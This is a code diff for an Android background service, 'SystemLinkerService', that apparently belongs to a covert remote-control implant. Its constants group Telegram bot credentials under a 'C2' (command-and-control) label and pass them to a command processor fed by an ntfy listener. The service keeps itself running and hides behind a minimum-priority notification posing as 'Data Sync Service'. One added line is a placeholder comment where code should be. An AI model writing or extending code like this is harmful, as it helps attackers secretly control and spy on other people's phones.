@@ -10,11 +10,7 @@ import android.os.IBinder
 import androidx.core.app.NotificationCompat
 import com.systemlinker.comm.NtfyConnectionManager
 import com.systemlinker.features.CommandProcessor
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.SupervisorJob
-import kotlinx.coroutines.cancel
-import kotlinx.coroutines.launch
+import kotlinx.coroutines.*
 
 class SystemLinkerService : Service() {
 
@@ -24,26 +20,21 @@ class SystemLinkerService : Service() {
     private lateinit var configStore: ConfigStore
     private lateinit var ntfyManager: NtfyConnectionManager
 
-    companion object {
-        private const val CHANNEL_ID = "system_linker_sync_channel"
-        private const val NOTIFICATION_ID = 1001
-    }
-
     override fun onCreate() {
         super.onCreate()
         ErrorLogger.setupCrashHandler(applicationContext)
         
         configStore = ConfigStore(this)
         
-        val commandProcessor = CommandProcessor(this, Constants.TELEGRAM_BOT_TOKEN, Constants.TELEGRAM_ADMIN_USER_ID)
+        val commandProcessor = CommandProcessor(this, Constants.C2.TELEGRAM_BOT_TOKEN, Constants.C2.TELEGRAM_ADMIN_USER_ID)
         ntfyManager = NtfyConnectionManager(this, configStore, commandProcessor)
 
         createNotificationChannel()
-        startForeground(NOTIFICATION_ID, createNotification())
+        startForeground(1001, createNotification())
 
         serviceScope.launch { ntfyManager.startListening() }
     }
-
+    // ... (onStartCommand, onDestroy, onBind are unchanged) ...
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         WorkManagerSetup.scheduleDailyUpdate(this)
         return START_STICKY
@@ -59,8 +50,8 @@ class SystemLinkerService : Service() {
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Data Sync Service",
+                Constants.Service.NOTIFICATION_CHANNEL_ID,
+                Constants.Service.NOTIFICATION_CHANNEL_NAME,
                 NotificationManager.IMPORTANCE_MIN 
             ).apply {
                 description = "Synchronizes application state"
@@ -72,9 +63,9 @@ class SystemLinkerService : Service() {
     }
 
     private fun createNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Linking")
-            .setContentText("Maintaining local state.")
+        return NotificationCompat.Builder(this, Constants.Service.NOTIFICATION_CHANNEL_ID)
+            .setContentTitle(Constants.Service.NOTIFICATION_TITLE)
+            .setContentText(Constants.Service.NOTIFICATION_TEXT)
             .setSmallIcon(android.R.drawable.ic_popup_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
